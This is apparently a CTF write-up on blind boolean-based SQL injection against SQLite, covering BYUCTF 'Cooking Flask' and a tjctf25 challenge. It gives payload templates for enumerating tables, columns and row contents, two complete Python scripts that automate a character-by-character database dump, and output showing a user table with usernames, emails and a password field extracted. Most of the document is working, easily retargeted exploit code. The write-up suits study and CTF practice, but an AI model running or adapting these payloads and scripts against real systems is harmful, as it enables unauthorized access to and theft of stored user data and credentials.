------------------

### Exploiting sqlite3

------------------

### Blind SQLite3 exfiltration

-----------------

- The method below is `Boolean based` which is `True` or `False` e.g If a statement is true, return this data and if false, do not return this query.
- This approach will be explained with `BYUCTF` `cooking flask` web challenge.The `tag` query is vulnerable-:

![image](https://github.com/user-attachments/assets/0f4fe54e-c1ed-4e87-a3d1-ccdfc717b127)

- Now let's move over to burp suite to understand the logic.If I send a statement `Italian%') and 1=1--+`,we get the data for `Italian` back because there is a column `Italian` and `1` is equals to `1` which is a true statement.You'll notice in the response tab that we got the data for `Italian`.

![image](https://github.com/user-attachments/assets/38f49ef1-6e3e-4f5a-8387-a4a32f74d597)

- Now, let us pass a false statement like `Italian%') and 1=2--+`, we didn't get any result.

![image](https://github.com/user-attachments/assets/d7610063-122a-4ba4-b85f-be22488c55c9)

- That's just the basis of Boolean based injection, if our statement is right,we'll get a positive result and if the statement is false, we'll get a negative result.

-----------------

### Counting the amount of tables

------------------

- The count() function in sql is used to count the amount of stuffs in a database. Digit will be placed after equals to `=`.`Count()` can count amount of rows,column and tables in a dataabase.

```sql
(SELECT count(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%' ) = {number}
```

-------------------

### Tables length

--------------------

- Use the length() function,the code below is used to count the character length of table.I added `LIMIT` and `OFFSET` because we have to limit the table to a single one.If offset is set to `0` and limit is set to `1`, the first row will be read, to read the others, you just need to increment it.`Offset-:`1 and `limit` to 2.

```sql
(SELECT length(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name not like 'sqlite_%' LIMIT 1 OFFSET 0) = {number}
```

---------------------

### Reading the tables's characters

----------------------

- The functions `hex()` and `substr()` are useful in this scenario.You limit the rows and column with limit and offset and select the characters with `substr()`,the substr requires 3 arguments `(tbl_name,{characters'limit},{character's start})` which is hexed with `hex()` and checked if it is equal to a character that is hexed.The second argument of substr should be incremented only while the third argument is set to `1`.

```sqlite
(SELECT hex(substr(tbl_name,{character's end},{character's stop})) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%' limit {i+1} offset {i}) = hex('{char}')--+"
```

-------------------

### Counting Columns-:

-------------------

- Query-:`count()`

```sqlite3
(SELECT count(name) FROM PRAGMA_TABLE_INFO('{table_name}'))={number}
```

-----------------------

### Column's length

-----------------------

- Query-:`length()`

```sqlite3
(SELECT+length(name)+FROM+PRAGMA_TABLE_INFO('{table_name}')+LIMIT+{end}+OFFSET+{start})={number}
```

------------------------

### Column's characters

------------------------

- Welp,limit and offset requires the same logic used for tables but `substr()`'s second argument should be set to `1` and the third one should incremented.`WHEN` holds the characters found e.g substr(name,1,4) indicates you are looking for the fourth character, so `WHEN` should be `fla+{new_character}`.

```sqlite3
(select+case+substr(name,1,{digit+1})+WHEN+'{character}'+THEN+1+ELSE+1/0+END+FROM+PRAGMA_TABLE_INFO('{table_name}') LIMIT {i+1} OFFSET {i})
```

---------------------------

### COUNTING THE ROWS IN A COLUMN

--------------------

- You still have to use count() to achieve this.

```sqlite3
(SELECT+count({column_name})+FROM+{table_name})={digit}
```

--------------------

### COUNTING THE CHARACTER LENGTH OF A ROW

---------------------

- OFFSET AND LIMIT perform the same job and limit the rows to one.It still requires length like tables and columns.

```sqlite3
(SELECT+length({column_name})+FROM+{table_name} LIMIT {length+1} OFFSET {length})={digit}
```

---------------------

### Reading character off the rows 

---------------------

- Query

```sql
(select case substr({column_name},1,{digit to be incremented}) WHEN '{character}' THEN 1 ELSE 1/0 END FROM {table_name} LIMIT {i+1} OFFSET {i})
```

----------------------

### BYU CTF solve script [Cooking Flask]

-----------------------

![image](https://github.com/user-attachments/assets/17c58d24-1f89-456f-a1de-9718d9cab29d)

-----------------------

- Script to dump the whole db-:

```python
#! /usr/bin/env python3
import requests
import string
url = "https://cooking.chal.cyberjousting.com/search?"
charset = string.printable
def count_table():
    for i in range(100):
        payload = f"recipe_name=pasta&description=It+is+so+good+with+parm.&tags=Italian%') and (SELECT count(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%' ) = {i+1}--+"
        res = requests.get(url+payload).text
        if "Boil the pasta" in res:
            print(f"[+] Number of tables-:{i+1}")
            return i+1
            break

def find_tableLength(length):
    print("[+]Finding table Length")
    while True:
        for length in range(length,length+1):
             for i in range(100):
                 payload= f"recipe_name=pasta&description=It+is+so+good+with+parm.&tags=Italian%') and (SELECT length(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name not like 'sqlite_%' LIMIT {length+1} OFFSET {length}) = {i+1}--+"
                 res = requests.get(url+payload).text
                 if "Boil the pasta" in res:
                    print(f"[+] Table-Length:-:{i+1}")
                    return i+1
                    break
def read_tableChar(tables_number):
    table_name = []
    for i in range(0,tables_number):
        table_name.append("")
        length = find_tableLength(i)
        for digit in range(0,length):
            for char in charset:
                payload = f"recipe_name=pasta&description=It+is+so+good+with+parm.&tags=Italian%') and (SELECT hex(substr(tbl_name,{digit+1},1)) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%' limit {i+1} offset {i}) = hex('{char}')--+"
                res = requests.get(url+payload).text
                if "Boil the pasta" in res:
                    print(f"[+] Found Char:-:{char}")
                    table_name[i] += char
                    break
            if len(table_name[i]) == length:
               print(f"[+] Table Found: {table_name[i]}")
               pass
               if len(table_name) == tables_number:
                   print(f"[+] Tables:{table_name}")
                   break           
    return table_name
def count_columns(table: str):
    while True:
        for digit in range(100):
            payload = f"/search?recipe_name=pasta&description=It+is+so+good+with+parm.&tags=Italian%')+and+(SELECT+count(name)+FROM+PRAGMA_TABLE_INFO('{table}'))={digit+1}--+"
            res = requests.get(url+payload)
            if "Boil the pasta" in res.text:
                print(f"[+] Number of Columns-:{digit+1}")
                return digit+1
                break 
def find_columnLength(length: int,table: str):
    print("[+]Finding Columnn Length")
    while True:
        for length in range(length,length+1):
            for i in range(100):
                payload= f"recipe_name=pasta&description=It+is+so+good+with+parm.&tags=Italian%')+and+(SELECT+length(name)+FROM+PRAGMA_TABLE_INFO('{table}')+LIMIT+{length+1}+OFFSET+{length})={i}--+"
                res = requests.get(url+payload).text
                if "Boil the pasta" in res:
                    print(f"[+] Column-Length:-:{i}")
                    return i
                    break
def read_columnChars(column_number,table_name):
    column_names = {}.fromkeys([table_name])
    print(f"[+]Dumping Columns:table:{table_name}")
    column_names[table_name] = []
    for i in range(0,column_number):
        column_names[table_name].append("")
        length = find_columnLength(i,table_name)
        for digit in range(0,length):
            for char in charset:
                payload = f"/search?recipe_name=pasta&description=It+is+so+good+with+parm.&tags=Italian%')+and+(select+case+substr(name,1,{digit+1})+WHEN+'{column_names[table_name][i] +char}'+THEN+1+ELSE+1/0+END+FROM+PRAGMA_TABLE_INFO('{table_name}') LIMIT {i+1} OFFSET {i})+--+"
                res = requests.get(url+payload).text
                if "Boil the pasta" in res:
                    print(f"[+] Found Char:-:{char}")
                    column_names[table_name][i] += char
                    break
            if (len(column_names[table_name][i]) == length):
               print(f"[+] Column name dumped::{column_names[table_name][i]}")
               pass
               if len(column_names[table_name]) == column_number:
                  print(f"[+] ColumnDumped::{column_names}")
                  break
    return column_names
def count_Data(column_name,table_name):
    while True:
        for digit in range(200):
            payload = f"/search?recipe_name=pasta&description=It+is+so+good+with+parm.&tags=Italian%')+and+(SELECT+count({column_name})+FROM+{table_name})={digit}+--+"
            res = requests.get(url+payload).text
            if "Boil the pasta" in res:
                print(f"[+] Number of Data's strings-:{digit}")
                return digit
                break
def count_stringLength(data_length,column_name,table_name):
    print("[+]Finding String Length")
    while True:
        for length in range(data_length,data_length+1):
            for i in range(100):
                payload= f"/search?recipe_name=pasta&description=It+is+so+good+with+parm.&tags=Italian%')+and+(SELECT+length({column_name})+FROM+{table_name} LIMIT {length+1} OFFSET {length})={i}--+"
                res = requests.get(url+payload).text
                if "Boil the pasta" in res:
                    print(f"[+] String-Length:-:{i}")
                    return i
                    break
def readChars(data_length,column_name,table_name):
    data_names = {}.fromkeys([column_name])
    print(f"[+]Dumping String:table:{table}:column:{column_name}")
    data_names[column_name] = []
    for i in range(0,data_length):
        data_names[column_name].append("")
        length = count_stringLength(i,column_name,table_name)
        for digit in range(0,length):
            for char in charset:
                payload = f"/search?recipe_name=pasta&description=It+is+so+good+with+parm.&tags=Italian%') and (select case substr({column_name},1,{digit+1}) WHEN '{data_names[column_name][i]+char}' THEN 1 ELSE 1/0 END FROM {table_name} LIMIT {i+1} OFFSET {i})--+"
                res = requests.get(url+payload).text
                if "Boil the pasta" in res:
                    print(f"[+] Found Char:-:{char}")
                    data_names[column_name][i] += char
                    break
            if (len(data_names[column_name][i]) == length):
               print(f"[+] Column {column_name} dumped::{data_names[column_name][i]}")
               pass
               if len(data_names) == data_length:
                  print(f"[+] ColumnDumped::{data_names}")
                  break
               
if __name__ == "__main__":
    tables_number: str = count_table()
    #tables = read_tableChar(tables_number)
    tables = ['user', 'login_attempt', 'login_session', 'recipe', 'personal_cookbook_entry', 'to_try_entry']
    for table in tables:
        column_number = count_columns(table)
        #columns = read_columnChars(column_number,table)
        columns = {'user': ['user_id', 'username', 'user_email', 'first_name', 'last_name', 'password', 'date_joined']}
        for column in columns[table]:
            data_length = count_Data(column,table)
            readChars(data_length,column,table)
```

- Script result-:

```bash
root@ubuntu:/tmp# ./try.py
[+] Number of tables-:6
[+]Finding table Length
[+] Table-Length:-:4
[+] Table Found: user
[+]Finding table Length
[+] Table-Length:-:13
[+] Table Found: login_attempt
[+]Finding table Length
[+] Table-Length:-:13
[+] Table Found: login_session
[+]Finding table Length
[+] Table-Length:-:6
[+] Table Found: recipe
[+]Finding table Length
[+] Table-Length:-:23
[+] Table Found: personal_cookbook_entry
[+]Finding table Length
[+] Table-Length:-:12
[+] Table Found: to_try_entry
[+] Tables:['user', 'login_attempt', 'login_session', 'recipe', 'personal_cookbook_entry', 'to_try_entry']
[+] Number of Columns-:7
[+]Dumping Columns:table:user
[+]Finding Columnn Length
[+] Column-Length:-:7
[+] Column name dumped::user_id
[+]Finding Columnn Length
[+] Column-Length:-:8
[+] Column name dumped::username
[+]Finding Columnn Length
[+] Column-Length:-:10
[+] Column name dumped::user_email
[+]Finding Columnn Length
[+] Column-Length:-:10
[+] Column name dumped::first_name
[+]Finding Columnn Length
[+] Column-Length:-:9
[+] Column name dumped::last_name
[+]Finding Columnn Length
[+] Column-Length:-:8
[+] Column name dumped::password
[+]Finding Columnn Length
[+] Column-Length:-:11
[+] Column name dumped::date_joined
[+] ColumnDumped::{'user': ['user_id', 'username', 'user_email', 'first_name', 'last_name', 'password', 'date_joined']}
[+] Number of Data's rows-:3
[+]Dumping String:table:user:column:user_id
[+]Finding String Length
[+] String-Length:-:1
[+] Column user_id dumped::1
[+]Finding String Length
[+] String-Length:-:1
[+] Column user_id dumped::3
[+]Finding String Length
[+] String-Length:-:1
[+] Column user_id dumped::2
[+] Number of Data's rows-:3
[+]Dumping String:table:user:column:username
[+]Finding String Length
[+] String-Length:-:5
[+] Column username dumped::admin
[+]Finding String Length
[+] String-Length:-:14
[+] Column username dumped::steve_and_alex
[+]Finding String Length
[+] String-Length:-:5
[+] Column username dumped::cosmo
[+] Number of Data's rows-:3
[+]Dumping String:table:user:column:user_email
[+]Finding String Length
[+] String-Length:-:15
[+] Column user_email dumped::admin@admin.com
[+]Finding String Length
[+] String-Length:-:20
[+] Column user_email dumped::cosmo_cougar@byu.edu
[+]Finding String Length
[+] String-Length:-:19
[+] Column user_email dumped::steve@minecraft.net
[+] Number of Data's rows-:3
[+]Dumping String:table:user:column:first_name
[+]Finding String Length
[+] String-Length:-:10
[+] Column first_name dumped::AdminFirst
[+]Finding String Length
[+] String-Length:-:5
[+] Column first_name dumped::Steve
[+]Finding String Length
[+] String-Length:-:12
[+] Column first_name dumped::cosmopolitan
[+] Number of Data's rows-:3
[+]Dumping String:table:user:column:last_name
[+]Finding String Length
[+] String-Length:-:9
[+] Column last_name dumped::AdminLast
[+]Finding String Length
[+] String-Length:-:9
[+] Column last_name dumped::Herobrine
[+]Finding String Length
[+] String-Length:-:6
[+] Column last_name dumped::cougar
[+] Number of Data's rows-:3
[+]Dumping String:table:user:column:password
[+]Finding String Length
[+] String-Length:-:58
[+] Column password dumped::byuctf{pl34s3_p4r4m3t3r1z3_y0ur_1nputs_4nd_h4sh_p4ssw0rds}
```

- Flag-:```byuctf{pl34s3_p4r4m3t3r1z3_y0ur_1nputs_4nd_h4sh_p4ssw0rds}```

![image](https://github.com/user-attachments/assets/a0b662ff-0587-45ba-a2e6-b2cf2a1e7a46)

-----------------------

### Update on the script after tjctf25-:

-----------------------

- Script-:

```python3
#! /usr/bin/env python3
import asyncio
import requests
import string
from rich.table import Table
from rich.console import Console

url = "https://chill-site-019525b981483b06.tjc.tf"
charset = string.printable
valid_word = "Password (hashed): 9a23b6d49aa244b7b0db52949c0932c365ec8191"
async def count_table():
    for i in range(100):
        payload = f"test' and (SELECT count(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%' ) = {i+1}/*"
        data = {"username":payload,"password":"z"}
        res = requests.post(url,data=data).text
        if valid_word in res:
            print(f"[+] Number of tables-:{i+1}")
            return i+1
            break

async def find_tableLength(length):
    print("[+]Finding table Length")
    while True:
        for length in range(length,length+1):
             for i in range(100):
                 payload= f"test' and (SELECT length(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name not like 'sqlite_%' LIMIT {length+1} OFFSET {length}) = {i+1}/*"
                 data = {"username":payload,"password":"z"}
                 res = requests.post(url,data=data).text
                 if valid_word in res:
                    print(f"[+] Table-Length:-:{i+1}")
                    return i+1
                    break
async def read_tableChar(tables_number):
    table_name = []
    for i in range(0,tables_number):
        table_name.append("")
        length = await find_tableLength(i)
        for digit in range(0,length):
            for char in charset:
                payload = f"test' and (SELECT hex(substr(tbl_name,{digit+1},1)) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%' limit {i+1} offset {i}) = hex('{char}')/*"
                data = {"username":payload,"password":"z"}
                res = requests.post(url,data=data).text
                if valid_word in res:
                    print(f"[+] Found Char:-:{char}")
                    table_name[i] += char
                    break
            if len(table_name[i]) == length:
               print(f"[+] Table Found: {table_name[i]}")
               pass
               if len(table_name) == tables_number:
                   #print(f"[+] Tables:{table_name}")
                   break           
    return table_name
async def count_columns(table: str):
    while True:
        print(f"[+] Table:{table}")
        for digit in range(500):
            payload = f"test' and (SELECT count(name) FROM PRAGMA_TABLE_INFO('{table}'))={digit+1}/*"
            data = {"username":payload,"password":"z"}
            res = requests.post(url,data=data).text
            if valid_word in res:
                print(f"[+] Number of Columns-:{digit+1}")
                return digit+1
                break 
async def find_columnLength(length: int,table: str):
    print("[+]Finding Columnn Length")
    while True:
        for length in range(length,length+1):
            for i in range(100):
                payload= f"test' and (SELECT length(name) FROM PRAGMA_TABLE_INFO('{table}') LIMIT {length+1} OFFSET+{length})={i}/*"
                data = {"username":payload,"password":"z"}
                res = requests.post(url,data=data).text
                if valid_word in res:
                    print(f"[+] Column-Length:-:{i}")
                    return i
                    break
async def read_columnChars(column_number,table_name):
    column_names = {}.fromkeys([table_name])
    print(f"[+]Dumping Columns:table:{table_name}")
    column_names[table_name] = []
    for i in range(0,column_number):
        column_names[table_name].append("")
        length = await find_columnLength(i,table_name)
        for digit in range(0,length):
            for char in charset:
                payload = f"test' and (select case substr(name,1,{digit+1}) WHEN '{column_names[table_name][i] +char}' THEN 1 ELSE 1/0 END FROM PRAGMA_TABLE_INFO('{table_name}') LIMIT {i+1} OFFSET {i})/*"
                data = {"username":payload,"password":"z"}
                res = requests.post(url,data=data).text
                if valid_word in res:
                    print(f"[+] Found Char:-:{char}")
                    column_names[table_name][i] += char
                    break
            if (len(column_names[table_name][i]) == length):
               print(f"[+] Column name dumped::{column_names[table_name][i]}")
               pass
               if len(column_names[table_name]) == column_number:
                  #print(f"[+] ColumnDumped::{column_names}")
                  break
    return column_names
async def count_Data(column_name,table_name):
    while True:
        for digit in range(200):
            payload = f"test' and (SELECT count({column_name}) FROM {table_name})={digit}/*"
            data = {"username":payload,"password":"z"}
            res = requests.post(url,data=data).text
            if valid_word in res:
                print(f"[+] Number of Data's strings-:{digit}")
                return digit
                break
async def count_stringLength(data_length,column_name,table_name):
    print("[+]Finding String Length")
    while True:
        for length in range(data_length,data_length+1):
            for i in range(100):
                payload= f"test' and (SELECT length({column_name}) FROM {table_name} LIMIT {length+1} OFFSET {length})={i}/*"
                data = {"username":payload,"password":"z"}
                res = requests.post(url,data=data).text
                if valid_word in res:
                    print(f"[+] String-Length:-:{i}")
                    return i
                    break
async def readChars(data_length,column_name,table_name):
    data_names = {}.fromkeys([column_name])
    print(f"[+]Dumping String:table:{table_name}:column:{column_name}")
    data_names[column_name] = []
    for i in range(0,data_length):
        data_names[column_name].append("")
        length = await count_stringLength(i,column_name,table_name)
        for digit in range(0,length):
            for char in charset:
                payload = f"test' and (select case substr({column_name},1,{digit+1}) WHEN '{data_names[column_name][i]+char}' THEN 1 ELSE 1/0 END FROM {table_name} LIMIT {i+1} OFFSET {i})/*"
                data = {"username":payload,"password":"payload"}
                res = requests.post(url,data=data).text
                if valid_word in res:
                    print(f"[+] Found Char:-:{char}")
                    data_names[column_name][i] += char
                    break
            if (len(data_names[column_name][i]) == length):
               print(f"[+] Column {column_name} dumped::{data_names[column_name][i]}")
               pass
               if len(data_names[column_name]) == data_length:
                  print(f"[+] ColumnDumped::{data_names}")
                  return data_names
                  break
async def createTable(data: list) -> None:
    table = Table(title="Tables")
    console = Console()
    table.add_column(f"Table_names::{len(data)}", justify="center", style="cyan", no_wrap=True)
    for d in data:
        table.add_row(d)
    console.print(table)
async def createColumns(data: dict) -> None:
    data_keys = data.keys()
    console = Console()
    table = Table(title="Tables Columns")
    table.add_column(f"Table_names::{len(data)}", justify="center", style="cyan", no_wrap=True)
    table.add_column(f"Column_names::{len(data)}", justify="left", style="cyan")
    for i in data_keys: 
        table.add_row(i,','.join(column for column in data[i]))
    console.print(table)
async def createData(data: dict,table) -> None:
    data_keys = data.keys()
    console = Console()
    table = Table(title=f"Table::{table}")
    for d in data.keys():
        table.add_column(f"{d}", justify="center", style="cyan", no_wrap=True)
        for i in data[d]:
            table.add_row(i)
    console.print(table)
async def main():
    #tables_number: str = await count_table()
    #tables = await read_tableChar(tables_number)
    tables = ['database']
    await createTable(tables)
    for table in tables:
        #column_number = await count_columns(table)
        #columns = await read_columnChars(column_number,table)
        columns = {'database': ['pass','user', 'time']}
        await createColumns(columns)
        for column in columns[table]:
            data_length = await count_Data(column,table)
            data = await readChars(data_length,column,table)
            #data = {'user': ['You', 'test', 'TuxTheFlagMaster', 'humanA']}
            await createData(data,table)
if __name__ == "__main__":
    asyncio.run(main())
```

---------------------
